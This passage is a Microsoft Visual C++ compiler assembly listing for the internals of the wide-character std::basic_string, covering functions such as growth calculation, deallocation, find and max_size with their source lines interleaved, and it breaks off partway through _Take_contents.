?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1386 :     constexpr const _Ty1& _Get_first() const noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 1387 :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 1388 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1382 :     constexpr _Ty1& _Get_first() noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 1383 :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 1384 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 48
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT

; 4935 :     _CONSTEXPR20 const _Alty& _Getal() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 4936 :         return _Mypair._Get_first();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first

; 4937 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 48
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT

; 4931 :     _CONSTEXPR20 _Alty& _Getal() noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 4932 :         return _Mypair._Get_first();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first

; 4933 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z
_TEXT	SEGMENT
this$ = 48
_Right$ = 56
?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Swap_proxy_and_iterators, COMDAT

; 4927 :     _CONSTEXPR20 void _Swap_proxy_and_iterators(basic_string& _Right) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 4928 :         _Mypair._Myval2._Swap_proxy_and_iterators(_Right._Mypair._Myval2);

	mov	rax, QWORD PTR _Right$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	mov	rdx, rax
	call	?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z ; std::_Container_base0::_Swap_proxy_and_iterators

; 4929 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Swap_proxy_and_iterators
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
_TEXT	SEGMENT
$T1 = 32
_My_data$ = 40
_Ptr$2 = 48
_Al$3 = 56
this$ = 80
?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate, COMDAT

; 4892 :     _CONSTEXPR20 void _Tidy_deallocate() noexcept { // initialize buffer, deallocating any storage

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 4893 :         auto& _My_data = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 4894 :         _My_data._Orphan_all();

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 4895 :         _ASAN_STRING_REMOVE(*this);
; 4896 :         if (_My_data._Large_string_engaged()) {

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	?_Large_string_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_string_engaged
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN2@Tidy_deall

; 4897 :             const pointer _Ptr = _My_data._Bx._Ptr;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR _Ptr$2[rsp], rax

; 4898 :             auto& _Al          = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
	mov	QWORD PTR _Al$3[rsp], rax

; 4899 :             _Destroy_in_place(_My_data._Bx._Ptr);

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, rax
	call	??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z ; std::_Destroy_in_place<wchar_t *>

; 4900 : #if _HAS_CXX20
; 4901 :             if (_STD is_constant_evaluated()) { // begin the lifetime of the array elements before copying into them
; 4902 :                 _Construct_in_place(_My_data._Bx);
; 4903 :             }
; 4904 : #endif // _HAS_CXX20
; 4905 :             _Al.deallocate(_Ptr, _My_data._Myres + 1);

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax+24]
	inc	rax
	mov	r8, rax
	mov	rdx, QWORD PTR _Ptr$2[rsp]
	mov	rcx, QWORD PTR _Al$3[rsp]
	call	?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z ; std::allocator<wchar_t>::deallocate
$LN2@Tidy_deall:

; 4906 :         }
; 4907 : 
; 4908 :         _My_data._Mysize = 0;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+16], 0

; 4909 : #if _HAS_CXX20
; 4910 :         if (_STD is_constant_evaluated()) {
; 4911 :             _My_data._Myres = 0;
; 4912 :         } else
; 4913 : #endif // _HAS_CXX20
; 4914 :         {
; 4915 :             _My_data._Myres = _BUF_SIZE - 1;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+24], 7

; 4916 :             // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4917 :             _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	xor	eax, eax
	mov	WORD PTR $T1[rsp], ax
	mov	eax, 2
	imul	rax, rax, 0
	mov	rcx, QWORD PTR _My_data$[rsp]
	add	rcx, rax
	mov	rax, rcx
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, rax
	call	?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign
	npad	1

; 4918 :         }
; 4919 :     }

	add	rsp, 72					; 00000048H
	ret	0
?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Tidy_init@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
_TEXT	SEGMENT
$T1 = 32
_My_data$ = 40
this$ = 64
?_Tidy_init@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_init, COMDAT

; 4868 :     _CONSTEXPR20 void _Tidy_init() noexcept { // initialize basic_string data members

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 4869 :         auto& _My_data   = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 4870 :         _My_data._Mysize = 0;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+16], 0

; 4871 : 
; 4872 : #if _HAS_CXX20
; 4873 :         if (_STD is_constant_evaluated()) {
; 4874 :             _My_data._Myres        = _BUF_SIZE; // SSO disabled in constexpr context
; 4875 :             auto& _Al              = _Getal();
; 4876 :             const pointer _New_ptr = _Al.allocate(_BUF_SIZE + 1); // throws
; 4877 :             _My_data._Bx._Ptr      = _New_ptr;
; 4878 : 
; 4879 :             _Elem* const _Raw_new = _Unfancy(_New_ptr);
; 4880 :             _Traits::assign(_Raw_new, _BUF_SIZE + 1, _Elem());
; 4881 :         } else
; 4882 : #endif // _HAS_CXX20
; 4883 :         {
; 4884 :             _My_data._Myres = _BUF_SIZE - 1;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+24], 7

; 4885 :             // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4886 :             _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	xor	eax, eax
	mov	WORD PTR $T1[rsp], ax
	mov	eax, 2
	imul	rax, rax, 0
	mov	rcx, QWORD PTR _My_data$[rsp]
	add	rcx, rax
	mov	rax, rcx
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, rax
	call	?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 4887 :         }
; 4888 : 
; 4889 :         _ASAN_STRING_CREATE(*this);
; 4890 :     }

	add	rsp, 56					; 00000038H
	ret	0
?_Tidy_init@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_init
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z
_TEXT	SEGMENT
this$ = 48
_Requested$ = 56
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 4763 :     _NODISCARD _CONSTEXPR20 size_type _Calculate_growth(const size_type _Requested) const noexcept {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 4764 :         return _Calculate_growth(_Requested, _Mypair._Myval2._Myres, max_size());

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	mov	r8, rax
	mov	rax, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rax+24]
	mov	rcx, QWORD PTR _Requested$[rsp]
	call	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth

; 4765 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z
_TEXT	SEGMENT
_Masked$ = 32
$T1 = 40
_Requested$ = 64
_Old$ = 72
_Max$ = 80
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 4750 :         const size_type _Requested, const size_type _Old, const size_type _Max) noexcept {

$LN5:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 4751 :         const size_type _Masked = _Requested | _ALLOC_MASK;

	mov	rax, QWORD PTR _Requested$[rsp]
	or	rax, 7
	mov	QWORD PTR _Masked$[rsp], rax

; 4752 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

	mov	rax, QWORD PTR _Max$[rsp]
	cmp	QWORD PTR _Masked$[rsp], rax
	jbe	SHORT $LN2@Calculate_

; 4753 :             return _Max;

	mov	rax, QWORD PTR _Max$[rsp]
	jmp	SHORT $LN1@Calculate_
$LN2@Calculate_:

; 4754 :         }
; 4755 : 
; 4756 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

	xor	edx, edx
	mov	rax, QWORD PTR _Old$[rsp]
	mov	ecx, 2
	div	rcx
	mov	rcx, QWORD PTR _Max$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	cmp	QWORD PTR _Old$[rsp], rax
	jbe	SHORT $LN3@Calculate_

; 4757 :             return _Max;

	mov	rax, QWORD PTR _Max$[rsp]
	jmp	SHORT $LN1@Calculate_
$LN3@Calculate_:

; 4758 :         }
; 4759 : 
; 4760 :         return (_STD max)(_Masked, _Old + _Old / 2);

	xor	edx, edx
	mov	rax, QWORD PTR _Old$[rsp]
	mov	ecx, 2
	div	rcx
	mov	rcx, QWORD PTR _Old$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR $T1[rsp], rax
	lea	rdx, QWORD PTR $T1[rsp]
	lea	rcx, QWORD PTR _Masked$[rsp]
	call	??$max@_K@std@@YAAEB_KAEB_K0@Z		; std::max<unsigned __int64>
	mov	rax, QWORD PTR [rax]
$LN1@Calculate_:

; 4761 :     }

	add	rsp, 56					; 00000038H
	ret	0
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?find@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KAEBV12@_K@Z
_TEXT	SEGMENT
tv72 = 48
this$ = 80
_Right$ = 88
_Off$ = 96
?find@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KAEBV12@_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::find, COMDAT

; 4393 :     _NODISCARD _CONSTEXPR20 size_type find(const basic_string& _Right, const size_type _Off = 0) const noexcept {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 4394 :         // look for _Right beginning at or after _Off
; 4395 :         return static_cast<size_type>(_Traits_find<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize, _Off,

	mov	rax, QWORD PTR _Right$[rsp]
	mov	rcx, rax
	call	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
	mov	QWORD PTR tv72[rsp], rax
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
	mov	rcx, QWORD PTR _Right$[rsp]
	mov	rcx, QWORD PTR [rcx+16]
	mov	QWORD PTR [rsp+32], rcx
	mov	rcx, QWORD PTR tv72[rsp]
	mov	r9, rcx
	mov	r8, QWORD PTR _Off$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rcx+16]
	mov	rcx, rax
	call	??$_Traits_find@U?$char_traits@_W@std@@@std@@YA_KQEB_W_K101@Z ; std::_Traits_find<std::char_traits<wchar_t> >

; 4396 :             _Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize));
; 4397 :     }

	add	rsp, 72					; 00000048H
	ret	0
?find@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KAEBV12@_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::find
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
$T1 = 32
_Alloc_max$ = 40
_Storage_max$ = 48
$T2 = 56
$T3 = 64
this$ = 96
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size, COMDAT

; 4157 :     _NODISCARD _CONSTEXPR20 size_type max_size() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H

; 4158 :         const size_type _Alloc_max   = _Alty_traits::max_size(_Getal());

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
	mov	rcx, rax
	call	?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
	mov	QWORD PTR _Alloc_max$[rsp], rax

; 4159 :         const size_type _Storage_max = // can always store small string

	mov	QWORD PTR $T1[rsp], 8
	lea	rdx, QWORD PTR $T1[rsp]
	lea	rcx, QWORD PTR _Alloc_max$[rsp]
	call	??$max@_K@std@@YAAEB_KAEB_K0@Z		; std::max<unsigned __int64>
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR _Storage_max$[rsp], rax

; 4160 :             (_STD max)(_Alloc_max, static_cast<size_type>(_BUF_SIZE));
; 4161 :         return (_STD min)(static_cast<size_type>((numeric_limits<difference_type>::max)()),

	mov	rax, QWORD PTR _Storage_max$[rsp]
	dec	rax
	mov	QWORD PTR $T2[rsp], rax
	call	?max@?$numeric_limits@_J@std@@SA_JXZ	; std::numeric_limits<__int64>::max
	mov	QWORD PTR $T3[rsp], rax
	lea	rdx, QWORD PTR $T2[rsp]
	lea	rcx, QWORD PTR $T3[rsp]
	call	??$min@_K@std@@YAAEB_KAEB_K0@Z		; std::min<unsigned __int64>
	mov	rax, QWORD PTR [rax]

; 4162 :             _Storage_max - 1 // -1 is for null terminator and/or npos
; 4163 :         );
; 4164 :     }

	add	rsp, 88					; 00000058H
	ret	0
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
this$ = 8
?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size, COMDAT

; 4153 :     _NODISCARD _CONSTEXPR20 size_type size() const noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 4154 :         return _Mypair._Myval2._Mysize;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+16]

; 4155 :     }

	ret	0
?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ
_TEXT	SEGMENT
this$ = 48
?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::data, COMDAT

; 4139 :     _NODISCARD _CONSTEXPR20 _Ret_z_ const _Elem* data() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 4140 :         return _Mypair._Myval2._Myptr();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr

; 4141 :     }

	add	rsp, 40					; 00000028H
	ret	0
?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::data
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 3206 :     _CONSTEXPR20 ~basic_string() noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 3207 :         _Tidy_deallocate();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate

; 3208 : #if _ITERATOR_DEBUG_LEVEL != 0
; 3209 :         auto&& _Alproxy          = _GET_PROXY_ALLOCATOR(_Alty, _Getal());
; 3210 :         const auto _To_delete    = _Mypair._Myval2._Myproxy;
; 3211 :         _Mypair._Myval2._Myproxy = nullptr;
; 3212 :         _Delete_plain_internal(_Alproxy, _To_delete);
; 3213 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 3214 :     }

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
	add	rsp, 40					; 00000028H
	ret	0
??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z
_TEXT	SEGMENT
_Right_data$ = 32
_My_data$ = 40
tv93 = 48
this$ = 80
_Right$ = 88
?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents, COMDAT

; 3097 :     _CONSTEXPR20 void _Take_contents(basic_string& _Right) noexcept {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 3098 :         // assign by stealing _Right's buffer
; 3099 :         // pre: this != &_Right
; 3100 :         // pre: allocator propagation (POCMA) from _Right, if necessary, is complete
; 3101 :         // pre: *this owns no memory, iterators orphaned
; 3102 :         // (note: _Buf/_Ptr/_Mysize/_Myres may be garbage init)
; 3103 :         auto& _My_data    = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 3104 :         auto& _Right_data = _Right._Mypair._Myval2;

	mov	rax, QWORD PTR _Right$[rsp]
	mov	QWORD PTR _Right_data$[rsp], rax

; 3105 : 
; 3106 :         if constexpr (_Can_memcpy_val) {
; 3107 : #if _HAS_CXX20
; 3108 :             if (!_STD is_constant_evaluated())
; 3109 : #endif // _HAS_CXX20
; 3110 :             {
; 3111 : #if _ITERATOR_DEBUG_LEVEL != 0
; 3112 :                 if (_Right_data._Large_string_engaged()) {
; 3113 :                     // take ownership of _Right's iterators along with its buffer
; 3114 :                     _Swap_proxy_and_iterators(_Right);
; 3115 :                 } else {
; 3116 :                     _Right_data._Orphan_all();
; 3117 :                 }
